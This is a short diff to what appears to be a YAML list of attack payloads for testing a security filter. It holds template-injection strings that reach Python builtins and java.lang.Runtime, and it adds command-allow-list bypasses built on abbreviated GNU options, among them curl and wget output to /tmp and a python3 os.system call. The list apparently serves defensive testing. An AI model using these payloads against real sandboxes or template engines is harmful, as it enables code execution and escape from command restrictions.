@@ -46,3 +46,13 @@ template_injection:
   - "{{''.__class__.__mro__[1].__subclasses__()}}"
   - "{{request.application.__globals__.__builtins__}}"
   - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))"
+
+# safeBins bypass (GNU long-option abbreviation)
+safebins_gnu_bypass:
+  - "ls --he"
+  - "cat --numb"
+  - "grep --colo"
+  - "curl --out /tmp/exfil"
+  - "wget --outp /tmp/data"
+  - "tar --extrac"
+  - "python3 --comm 'import os; os.system(\"id\")'"
